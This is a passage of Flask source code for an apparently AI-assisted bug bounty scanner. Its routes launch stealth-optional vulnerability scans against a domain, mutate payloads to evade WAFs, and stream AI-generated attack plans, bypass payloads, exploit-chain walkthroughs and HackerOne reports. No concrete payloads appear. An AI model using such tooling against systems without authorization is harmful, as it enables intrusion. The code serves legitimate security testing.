    expected = os.environ.get("BUGSCAN_API_KEY","")
    if expected and api_key != expected:
        return jsonify({"error":"unauthorized"}), 401
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    bugs    = payload.get("bugs", ["expose","cors","xss","sqli","ssrf","idor","actuator"])
    stealth = payload.get("stealth","normal")
    if not d:
        return jsonify({"error":"missing domain"}), 400
    # Async scan trigger
    q    = queue.Queue(maxsize=2000)
    sess = _sess(d)
    sess["scan_q"] = q
    def _run():
        try:
            run_scan(d, bugs, q, db, stealth_mode=stealth, auto_select=True)
        except Exception as e:
            log.error(f"cicd scan {d}: {e}")
    t = threading.Thread(target=_run, daemon=True)
    sess["scan_t"] = t
    t.start()
    return jsonify({
        "ok":      True,
        "domain":  d,
        "bugs":    bugs,
        "stealth": stealth,
        "status":  "running",
        "results": f"/results?domain={d}",
    })


# ── PDF Report ────────────────────────────────────────────────────────────────
@app.route("/report/pdf", methods=["POST"])
def report_pdf():
    try:
        from engine.pdf_report import generate_pdf
        payload  = request.get_json(silent=True, force=True) or {}
        d        = _domain(payload.get("domain",""))
        if not d: return jsonify({"error":"no domain"}), 400
        findings = db.get_findings(d)
        hosts    = db.get_hosts(d)
        meta     = db.get_meta(d) or {}
        risk     = payload.get("risk","HIGH")
        # Generate markdown then convert to PDF
        stats    = {"subs": hosts.get("subs_count",0), "live": hosts.get("active_count",0),
                    "findings": len(findings), "critical": sum(1 for f in findings if f.get("severity")=="critical")}
        md       = f"# Security Report: {d}\n\n## Summary\n\n"
        md      += f"- Subdomains: {stats['subs']}\n- Live hosts: {stats['live']}\n"
        md      += f"- Findings: {stats['findings']} ({stats['critical']} critical)\n\n"
        for f in findings[:50]:
            md  += f"## {f.get('title','Finding')} [{f.get('severity','').upper()}]\n"
            md  += f"**URL:** {f.get('url','')}\n\n{f.get('description','')}\n\n"
        pdf_bytes = generate_pdf(md, d, risk, stats)
        resp = Response(pdf_bytes, mimetype="application/pdf")
        resp.headers["Content-Disposition"] = f'attachment; filename="{d}-report.pdf"'
        return resp
    except Exception as e:
        log.exception("[report/pdf]")
        return jsonify({"error": str(e)}), 500


@app.route("/report/html")
def report_html_view():
    try:
        d        = _domain(request.args.get("domain",""))
        if not d: return "No domain specified", 400
        findings = db.get_findings(d)
        hosts    = db.get_hosts(d)
        stats    = {"subs": hosts.get("subs_count",0), "live": hosts.get("active_count",0),
                    "findings": len(findings)}
        # Build simple HTML report
        rows = ""
        for f in findings:
            sev = f.get("severity","info")
            color = {"critical":"#ef4444","high":"#f97316","medium":"#eab308","low":"#22c55e"}.get(sev,"#888")
            rows += f'<tr><td style="color:{color};font-weight:bold">{sev.upper()}</td>'
            rows += f'<td>{f.get("title","")}</td><td>{f.get("url","")}</td></tr>'
        html = f"""<!DOCTYPE html><html><head><title>Report: {d}</title>
        <style>body{{font-family:sans-serif;margin:2rem}}table{{width:100%;border-collapse:collapse}}
        td,th{{border:1px solid #ddd;padding:8px;text-align:left}}tr:nth-child(even){{background:#f9f9f9}}</style></head>
        <body><h1>Security Report: {d}</h1>
        <p>Subdomains: {stats['subs']} | Live: {stats['live']} | Findings: {stats['findings']}</p>
        <table><tr><th>Severity</th><th>Title</th><th>URL</th></tr>{rows}</table></body></html>"""
        return Response(html, mimetype="text/html")
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def _get_scheduler():
    try:
        from engine.scheduler import Scheduler
        if not hasattr(app, '_scheduler_instance') or app._scheduler_instance is None:
            try:
                import recon as _rc
                app._scheduler_instance = Scheduler(db, _rc.run_recon)
            except Exception:
                app._scheduler_instance = None
        return app._scheduler_instance
    except Exception as e:
        log.debug(f"[scheduler] {e}")
        return None

@app.route("/schedule/list")
def schedule_list():
    try:
        from engine.scheduler import human_interval, next_run_human
        sched = _get_scheduler()
        if sched is None:
            return jsonify({"schedules": [], "ok": True})
        schedules = sched.list()
        for s in schedules:
            s["interval_human"] = human_interval(s.get("interval_hours",24))
            s["next_run_human"] = next_run_human(s.get("next_run",0))
        return jsonify({"schedules": schedules})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/schedule/add", methods=["POST"])
def schedule_add():
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    bugs     = p.get("bugs", ["expose","cors","xss","sqli","ssrf","idor","actuator"])
    interval = int(p.get("interval_hours", 24))
    stealth  = p.get("stealth","normal")
    run_now  = p.get("run_now", False)
    label    = p.get("label","")
    if not d: return jsonify({"error":"missing domain"}), 400
    try:
        s = (lambda: (_get_scheduler() or type("F",(),{"add":lambda *a,**k:{}})()).add)()(d, bugs, interval, stealth,
                                  notify_on_new=True, run_now=run_now, label=label)
        sid = s.id if hasattr(s,"id") else (s.get("id","") if isinstance(s,dict) else str(s))
        return jsonify({"ok":True,"id":sid,"domain":d})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/schedule/remove", methods=["POST"])
def schedule_remove():
    sid = (request.get_json(silent=True, force=True) or {}).get("id","")
    sched = _get_scheduler()
    ok = sched.remove(sid) if sched else False
    return jsonify({"ok":ok})

@app.route("/schedule/pause", methods=["POST"])
def schedule_pause():
    sid = (request.get_json(silent=True, force=True) or {}).get("id","")
    sched = _get_scheduler()
    if sched: sched.pause(sid)
    return jsonify({"ok":True})

@app.route("/schedule/resume", methods=["POST"])
def schedule_resume():
    sid = (request.get_json(silent=True, force=True) or {}).get("id","")
    sched = _get_scheduler()
    if sched: sched.resume(sid)
    return jsonify({"ok":True})

# ── Mutator (adaptive payload mutation) ───────────────────────────────────────
@app.route("/mutate", methods=["POST"])
def mutate_payloads():
    p       = request.get_json(silent=True, force=True) or {}
    payloads= p.get("payloads",[])
    vendor  = p.get("waf_vendor","")
    context = p.get("context","generic")
    if not payloads:
        return jsonify({"error":"no payloads"}), 400
    try:
        from engine.mutator import get_mutator
        m = get_mutator()
        if vendor: m._waf_vendor = vendor
        result = []
        for payload in payloads[:10]:
            variants = m.mutate(payload, context=context)
            result.append({"original":payload,"variants":variants})
        return jsonify({"mutations":result})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

# ── AI Analysis ───────────────────────────────────────────────────────────────
@app.route("/ai/status")
def ai_status():
    has_key = bool(os.environ.get("ANTHROPIC_API_KEY",""))
    meta    = db.get_meta(_domain(request.args.get("domain","")))
    return jsonify({
        "configured":  has_key,
        "ai_enabled":  has_key,   # alias used by frontend
        "model":       "claude-sonnet-4-6",
        "has_summary": bool(meta.get("ai_summary")),
    })

# ── Auto-Retest ───────────────────────────────────────────────────────────────


# ══════════════════════════════════════════════════════════════════════════════
# RAG INTELLIGENCE + FULL AI ROUTE SUITE
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/ai/chat", methods=["POST"])
def ai_chat():
    """Real-time AI chat with full scan context + RAG intelligence injection."""
    import queue as _q, threading
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    user_msg = payload.get("message","").strip()
    history  = payload.get("history",[])
    stream   = payload.get("stream", True)
    if not user_msg:
        return jsonify({"error":"message required"}), 400

    db_findings = db.get_findings(d)
    tech_db     = db.get_tech(d)
    hosts       = db.get_hosts(d)
    waf_info    = db.get_meta(d) or {}
    waf         = waf_info.get("waf","")
    chains      = db.get_chains(d)
    ep_count    = db.count_endpoints(d)

    fe_raw      = payload.get("findings",[])
    findings    = fe_raw if isinstance(fe_raw, list) else db_findings
    fe_tech     = payload.get("tech",[])
    tech        = fe_tech if isinstance(fe_tech, list) and fe_tech else tech_db
    subs        = int(payload.get("subs",0) or hosts.get("subs_count",0))
    live        = int(payload.get("live",0) or hosts.get("active_count",0))

    if not stream:
        try:
            from engine.ai_agent import chat
            resp = chat(user_msg, history, domain=d, findings=findings,
                        tech=tech, waf=waf, chains=chains, subs=subs, live=live)
            return jsonify({"response": resp})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import chat
            chat(user_msg, history, domain=d, findings=findings,
                 tech=tech, waf=waf, chains=chains, subs=subs, live=live, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n\n⚠ {e}"})
        finally:
            q.put(None)

    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/attack_plan", methods=["POST"])
def ai_attack_plan():
    """Generate tactical attack plan from current findings."""
    import queue as _q, threading
    payload   = request.get_json(silent=True, force=True) or {}
    d         = _domain(payload.get("domain",""))
    findings  = db.get_findings(d)
    tech      = db.get_tech(d)
    meta      = db.get_meta(d) or {}
    waf       = meta.get("waf","")
    chains    = db.get_chains(d)
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import attack_plan
            attack_plan(d, findings, tech, waf, chains, [], stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/explain_finding", methods=["POST"])
def ai_explain_finding():
    """Deep technical explanation of a finding."""
    import queue as _q, threading
    p       = request.get_json(silent=True, force=True) or {}
    d       = _domain(p.get("domain",""))
    finding = p.get("finding", {})
    if not finding:
        return jsonify({"error":"finding required"}), 400
    tech     = db.get_tech(d)
    findings = db.get_findings(d)
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import explain_finding
            explain_finding(finding, domain=d, tech=tech, all_findings=findings, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/triage", methods=["POST"])
def ai_triage():
    """AI triage scoring for a finding — priority, exploitability, bounty."""
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", {})
    if not finding:
        return jsonify({"priority":"P2","score":5.0,"tip":"No finding provided"})
    try:
        from engine.ai_agent import triage_finding
        return jsonify(triage_finding(finding))
    except Exception as e:
        return jsonify({"priority":"P2","score":6.0,"error":str(e)})


@app.route("/ai/batch_review", methods=["POST"])
def ai_batch_review():
    """AI review of all findings — FP detection, priority ranking, bounty estimate."""
    import queue as _q, threading
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    fe_raw   = payload.get("findings")
    findings = fe_raw if isinstance(fe_raw, list) else db.get_findings(d)
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import batch_review
            batch_review(d, findings, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/summary", methods=["POST"])
def ai_summary_route():
    """Generate AI executive summary for scan results."""
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    findings = db.get_findings(d)
    tech     = db.get_tech(d)
    hosts    = db.get_hosts(d)
    meta     = db.get_meta(d) or {}
    try:
        from engine.ai_agent import scan_summary
        summary = scan_summary(d, findings, tech=tech,
                               subs=hosts.get("subs_count",0),
                               live=hosts.get("active_count",0))
        db.save_meta(d, {"ai_summary": summary})
        return jsonify(summary)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/ai/h1_format", methods=["POST"])
def ai_h1_format():
    """Generate complete HackerOne-ready report for a finding."""
    import queue as _q, threading
    p       = request.get_json(silent=True, force=True) or {}
    d       = _domain(p.get("domain",""))
    finding = p.get("finding", {})
    if not finding:
        return jsonify({"error":"finding required"}), 400
    tech    = db.get_tech(d)
    stream  = p.get("stream", False)
    if not stream:
        try:
            from engine.ai_agent import h1_report
            report = h1_report(finding, domain=d, tech=tech)
            return jsonify({"report": report})
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import h1_report
            h1_report(finding, domain=d, tech=tech, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/waf_bypass", methods=["POST"])
def ai_waf_bypass():
    """WAF bypass strategies and payloads for a specific target."""
    import queue as _q, threading
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    meta     = db.get_meta(d) or {}
    waf      = p.get("waf") or meta.get("waf","")
    bug_type = p.get("bug_type","xss")
    url      = p.get("url","")
    tech     = db.get_tech(d)
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import waf_bypass
            waf_bypass(waf, bug_type, url, tech=tech, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/payload_suggest", methods=["POST"])
def ai_payload_suggest():
    """Context-aware payload generation for a specific bug+endpoint."""
    import queue as _q, threading
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    bug_type = p.get("bug_type","xss")
    endpoint = p.get("endpoint","")
    tech     = db.get_tech(d)
    meta     = db.get_meta(d) or {}
    waf      = meta.get("waf","")
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import payload_suggest
            payload_suggest(bug_type, endpoint, domain=d, tech=tech, waf=waf, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/suggest_next", methods=["POST"])
def ai_suggest_next():
    """Suggest the single highest-value next action during a scan."""
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    findings = db.get_findings(d)
    tech     = db.get_tech(d)
    ep_count = db.count_endpoints(d)
    try:
        from engine.ai_agent import suggest_next
        result = suggest_next(d, findings, tech=tech, endpoints_count=ep_count)
        return jsonify({"suggestion": result})
    except Exception as e:
        return jsonify({"suggestion": f"Check findings manually: {e}"})


@app.route("/ai/attack_surface", methods=["POST"])
def ai_attack_surface():
    """Full attack surface analysis with unexplored vectors."""
    import queue as _q, threading
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    findings = db.get_findings(d)
    tech     = db.get_tech(d)
    hosts    = db.get_hosts(d)
    eps      = db.get_endpoints(d, limit=500)
    ep_list  = [e.get("url","") if isinstance(e,dict) else e for e in eps]
    log.info(f"[attack_surface] domain={d} endpoints={len(ep_list)} findings={len(findings)} tech={len(tech or [])}")
    log.info(f"[attack_surface] services={hosts.get('active_count',0)} subs={hosts.get('subs_count',0)}")

    # Prioritize endpoints — emit high_value_targets alongside AI stream
    try:
        from engine.priority_engine import build_high_value_targets
        hvt = build_high_value_targets(ep_list, findings)
        log.info(f"[attack_surface] priority engine: {len(hvt)} high-value targets scored")
    except Exception as _pe:
        log.debug(f"[attack_surface] priority engine: {_pe}")
        hvt = []

    q = _q.Queue()

    def _run():
        try:
            import os as _os
            _has_key = bool(_os.environ.get("ANTHROPIC_API_KEY","").strip())
            if _has_key:
                from engine.ai_agent import attack_surface
                attack_surface(d, findings, tech=tech,
                              endpoints=ep_list,
                              subs=hosts.get("subs_count",0), live=hosts.get("active_count",0),
                              stream_q=q)
            else:
                # Offline mode — full analysis from scan data, no API needed
                from engine.ai_agent import offline_analysis
                log.info(f"[attack_surface] AI offline — using local analysis engine")
                offline_analysis(d, findings, tech=tech, endpoints=ep_list,
                                 subs=hosts.get("subs_count",0),
                                 live=hosts.get("active_count",0),
                                 stream_q=q)
        except Exception as e:
            log.error(f"[attack_surface] error: {e}")
            # Last resort: still try offline
            try:
                from engine.ai_agent import offline_analysis
                offline_analysis(d, findings, tech=tech, endpoints=ep_list,
                                 subs=hosts.get("subs_count",0),
                                 live=hosts.get("active_count",0),
                                 stream_q=q)
            except Exception as e2:
                q.put({"type":"ai_chunk","text":f"⚠ Analysis error: {e2}"})
        finally:
            # Always emit high-value targets at the end
            if hvt:
                q.put({"type":"high_value_targets","targets":hvt[:20]})
            q.put(None)

    threading.Thread(target=_run, daemon=True).start()

    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/prioritize", methods=["POST"])
def ai_prioritize():
    """Score and rank endpoints by attack value. Returns high_value_targets[]."""
    p = request.get_json(silent=True, force=True) or {}
    d = _domain(p.get("domain",""))
    eps      = db.get_endpoints(d, limit=2000)
    findings = db.get_findings(d)
    ep_list  = [e.get("url","") if isinstance(e,dict) else e for e in eps]
    try:
        from engine.priority_engine import build_high_value_targets
        hvt = build_high_value_targets(ep_list, findings)
        log.info(f"[prioritize] {d}: {len(hvt)} high-value targets from {len(ep_list)} endpoints")
        return jsonify({
            "domain":             d,
            "total_endpoints":    len(ep_list),
            "high_value_targets": hvt,
            "critical":           sum(1 for t in hvt if t["priority"]=="critical"),
            "high":               sum(1 for t in hvt if t["priority"]=="high"),
        })
    except Exception as e:
        log.error(f"[prioritize] {e}")
        return jsonify({"error": str(e)}), 500


@app.route("/findings/next_steps", methods=["POST"])
def findings_next_steps():
    """Return next_attack_step[] for a single finding or all findings for a domain."""
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    finding  = p.get("finding")   # single finding dict, optional
    findings = db.get_findings(d)
    # Normalise DB key: "bug_type" → "bug" so next_attack_step() can use it
    for f in findings:
        if "bug" not in f and "bug_type" in f:
            f["bug"] = f["bug_type"]
    try:
        from engine.apex_brain import next_attack_step, enrich_findings_with_next_steps
        if finding:
            # Normalise the single finding too
            if "bug" not in finding and "bug_type" in finding:
                finding["bug"] = finding["bug_type"]
            steps = next_attack_step(finding, findings)
            return jsonify({"steps": steps, "count": len(steps)})
        else:
            enriched = enrich_findings_with_next_steps(findings)
            return jsonify({"enriched": len(enriched),
                            "sample": [{
                                "bug":   f.get("bug") or f.get("bug_type"),
                                "url":   f.get("url","")[:80],
                                "steps": f.get("next_steps",[])[:3],
                            } for f in enriched[:5]]})
    except Exception as e:
        log.error(f"[next_steps] {e}")
        return jsonify({"error": str(e)}), 500


@app.route("/ai/validate", methods=["POST"])
def ai_validate():
    """Heuristic validation — is this finding a true positive?"""
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", {})
    if not finding:
        return jsonify({"error":"finding required"}), 400
    try:
        from engine.ai_agent import validate_finding
        is_tp, conf_delta, reason = (True, 0, "unknown")
        # Use rag_intel quick heuristics
        from engine.rag_intel import score_artifact
        scored = score_artifact(url=finding.get("url",""), body=finding.get("poc",""))
        top    = scored["candidates"][0] if scored["candidates"] else {}
        conf   = finding.get("confidence",50)
        if top.get("score",0) < 0.2 and conf < 35:
            return jsonify({"is_tp":False,"confidence":conf-15,"reason":"Low pattern signal — likely FP"})
        return jsonify({"is_tp":True,"confidence":min(99,conf+int(top.get("score",0)*20)),
                        "reason":f"Pattern score {top.get('score',0):.2f} for {top.get('vuln','?')}"})
    except Exception as e:
        return jsonify({"is_tp":True,"confidence":50,"reason":str(e)})


@app.route("/ai/enhance_finding", methods=["POST"])
def ai_enhance_finding():
    """Enhance a finding with AI-generated CVSS, title, fix, tip."""
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", {})
    d       = _domain(p.get("domain",""))
    if not finding:
        return jsonify({"error":"finding required"}), 400
    tech = db.get_tech(d)
    try:
        from engine.ai_agent import enhance_finding
        enhanced = enhance_finding(finding, domain=d)
        return jsonify({"finding": enhanced})
    except Exception as e:
        return jsonify({"finding": finding, "error": str(e)})


@app.route("/ai/retest_plan", methods=["POST"])
def ai_retest_plan():
    """Generate a retest plan for all confirmed findings."""
    import queue as _q, threading
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    findings = db.get_findings(d)
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import retest_plan
            retest_plan(d, findings, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/chain_explain", methods=["POST"])
def ai_chain_explain():
    """Step-by-step guide to execute an exploit chain."""
    import queue as _q, threading
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    chain_id = p.get("chain_id","")
    chains   = db.get_chains(d)
    chain    = next((c for c in chains if str(c.get("id",""))==str(chain_id)), chains[0] if chains else {})
    if not chain:
        return jsonify({"error":"chain not found"}), 404
    q = _q.Queue()
    def _run():
        try:
            from engine.ai_agent import explain_chain
            explain_chain(chain, domain=d, stream_q=q)
        except Exception as e:
            q.put({"type":"ai_chunk","text":f"\n⚠ {e}"})
        finally:
            q.put(None)
    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/chain_detect", methods=["POST"])
def ai_chain_detect():
    """Detect exploit chains from current findings."""
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    findings = db.get_findings(d)
    try:
        from engine.apex_brain import detect_chains
        chains = detect_chains(findings)
        if chains:
            try: db.save_chains(d, chains)
            except Exception: pass
        return jsonify({"chains": chains, "count": len(chains)})
    except Exception as e:
        return jsonify({"chains": [], "error": str(e)})


# ── RAG-powered routes ──────────────────────────────────────────────────────

@app.route("/rag/score", methods=["POST"])
def rag_score():
    """Score an HTTP artifact using the RAG pattern engine (no LLM needed)."""
    p       = request.get_json(silent=True, force=True) or {}
    url     = p.get("url","")
    body    = p.get("body","")
    headers = p.get("headers",{})
    elapsed = float(p.get("elapsed",0))
    try:
        from engine.rag_intel import score_artifact
        return jsonify(score_artifact(url=url, body=body, headers=headers, elapsed=elapsed))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/rag/analyze_js", methods=["POST"])
def rag_analyze_js():
    """Analyze a JS file for endpoints, secrets, DOM sinks."""
    p       = request.get_json(silent=True, force=True) or {}
    url     = p.get("url","")
    content = p.get("content","")
    if not content:
        return jsonify({"error":"content required"}), 400
    try:
        from engine.rag_intel import analyze_js
        return jsonify(analyze_js(url, content))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/rag/fingerprint", methods=["POST"])
def rag_fingerprint():
    """Fingerprint tech stack from HTTP response."""
    p       = request.get_json(silent=True, force=True) or {}
    url     = p.get("url","")
    headers = p.get("headers",{})
    body    = p.get("body","")
    try:
        from engine.rag_intel import fingerprint_tech
        return jsonify(fingerprint_tech(url=url, headers=headers, body=body))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/rag/hints", methods=["POST"])
def rag_hints():
    """Get expert hints for a bug type + tech stack combo."""
    p        = request.get_json(silent=True, force=True) or {}
    bug_type = p.get("bug_type","xss")
    d        = _domain(p.get("domain",""))
    tech     = db.get_tech(d) or p.get("tech",[])
    try:
        from engine.rag_intel import get_hints
        hints = get_hints(bug_type, tech)
        return jsonify({"hints": hints, "bug_type": bug_type, "tech": tech[:5]})
    except Exception as e:
        return jsonify({"hints": [], "error": str(e)})


@app.route("/rag/context", methods=["POST"])
def rag_context():
    """Get full RAG context for the current scan state."""
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    findings = db.get_findings(d)
    tech     = db.get_tech(d)
    meta     = db.get_meta(d) or {}
    waf      = meta.get("waf","")
    ep_count = db.count_endpoints(d)
    try:
        from engine.rag_intel import build_rag_context
        ctx = build_rag_context(findings, tech, waf, d, ep_count)
        return jsonify({"context": ctx, "domain": d,
                        "findings_count": len(findings), "endpoints": ep_count})
    except Exception as e:
        return jsonify({"error": str(e)}), 500



# ── RAG Ingestion + Search Routes ─────────────────────────────────────────────

@app.route("/rag/ingest", methods=["POST"])
def rag_ingest_start():
    """
    Start ingesting H1 reports + writeups into the RAG database.
    Runs in background. sources=[] means fast preset (~2-3min).
    sources=["all"] means all 20+ sources (~20-30min).
    """
    import threading
    p       = request.get_json(silent=True, force=True) or {}
    sources = p.get("sources") or []
    embed   = p.get("embed", True)

    def _run():
        try:
            from engine.rag_ingest import run_all, FAST_SOURCES, SOURCES
            src = list(SOURCES.keys()) if "all" in sources else (sources or FAST_SOURCES)
            results = run_all(src, embed_after=embed)
            log.info(f"[rag] ingest complete: {results}")
        except Exception as e:
            log.error(f"[rag] ingest failed: {e}", exc_info=True)

    threading.Thread(target=_run, daemon=True, name="rag-ingest").start()
    try:
        from engine.rag_ingest import FAST_SOURCES, SOURCES
        src_list = list(SOURCES.keys()) if "all" in sources else (sources or FAST_SOURCES)
    except Exception:
        src_list = sources or ["fast-preset"]
    return jsonify({"ok": True, "message": "RAG ingestion started in background",
                    "sources": src_list,
                    "poll": "/rag/db_stats"})


@app.route("/rag/ingest_source", methods=["POST"])
def rag_ingest_one():
    """Ingest a single named source."""
    import threading
    p      = request.get_json(silent=True, force=True) or {}
    source = p.get("source","")
    if not source:
        return jsonify({"error": "source required"}), 400
    def _run():
        try:
            from engine.rag_ingest import run_source
            from engine.rag_db import embed_pending, build_index
            run_source(source)
            embed_pending()
            build_index()
        except Exception as e:
            log.error(f"[rag] source {source}: {e}")
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"ok": True, "source": source})


@app.route("/rag/search", methods=["POST"])
def rag_search():
    """Search RAG database for similar reports."""
    p        = request.get_json(silent=True, force=True) or {}
    query    = p.get("query","").strip()
    bug_type = p.get("bug_type","")
    tech     = p.get("tech","")
    severity = p.get("severity","")
    top_k    = int(p.get("top_k", 5))
    if not query and not bug_type:
        return jsonify({"error": "query or bug_type required"}), 400
    try:
        from engine.rag_db import search
        results = search(query or bug_type, top_k=top_k,
                         bug_type=bug_type, tech=tech, severity=severity)
        # Strip raw body for API response, keep preview
        for r in results:
            body = (r.get("body","") or "")
            r["preview"] = body[:300].replace("\n"," ").strip()
            r.pop("body", None)
        return jsonify({"results": results, "count": len(results), "query": query})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/rag/db_stats", methods=["GET"])
def rag_db_stats():
    """RAG database statistics — total reports, embeddings, breakdown by bug type."""
    try:
        from engine.rag_db import stats
        d = stats() or {}
        # Add aliases for frontend compatibility
        d.setdefault("total_chunks",    d.get("embedded", 0))
        d.setdefault("embedding_model", "text-embedding-3-small")
        d.setdefault("total_reports",   d.get("by_source", {}).get("total", 0))
        return jsonify(d)
    except Exception as e:
        return jsonify({"total_chunks":0,"embedding_model":"text-embedding-3-small",
                       "total_reports":0,"embedded":0,"error":str(e)})

@app.route("/rag/embed", methods=["POST"])
def rag_embed():
    """Embed any reports that don't have embeddings yet. Rebuilds index."""
    import threading
    def _run():
        try:
            from engine.rag_db import embed_pending, build_index
            n = embed_pending()
            build_index()
            log.info(f"[rag] embedded {n} reports")
        except Exception as e:
            log.error(f"[rag] embed: {e}")
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"ok": True, "message": "Embedding started in background. Poll /rag/db_stats."})




# ══════════════════════════════════════════════════════════════════════════════
# H1 INTELLIGENCE ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/h1/ingest", methods=["POST"])
def h1_ingest_start():
    """
    Start ingesting HackerOne disclosed reports.
    POST /h1/ingest {"max_reports": 5000, "resume": true, "build_index": true}
    Runs in background. Poll /h1/stats for progress.
    """
    p           = request.get_json(silent=True, force=True) or {}
    max_reports = int(p.get("max_reports", 5000))
    resume      = bool(p.get("resume", True))
    build_index = bool(p.get("build_index", True))

    if max_reports > 50000:
        return jsonify({"error": "max_reports capped at 50000"}), 400

    def _run():
        try:
            from engine.h1_ingest import run_ingest
            stats = run_ingest(
                max_reports  = max_reports,
                resume       = resume,
                build_index  = build_index,
                also_feed_rag= True,
            )
            log.info(f"[h1] ingest complete: {stats}")
        except Exception as e:
            log.error(f"[h1] ingest failed: {e}", exc_info=True)

    t = threading.Thread(target=_run, daemon=True, name="h1-ingest")
    t.start()
    return jsonify({
        "ok":       True,
        "message":  "H1 ingestion started in background",
        "max":      max_reports,
        "resume":   resume,
        "poll":     "/h1/stats",
    })


@app.route("/h1/stats", methods=["GET"])
def h1_stats():
    """Return H1 intelligence database statistics."""
    try:
        from engine.h1_ingest import db_stats
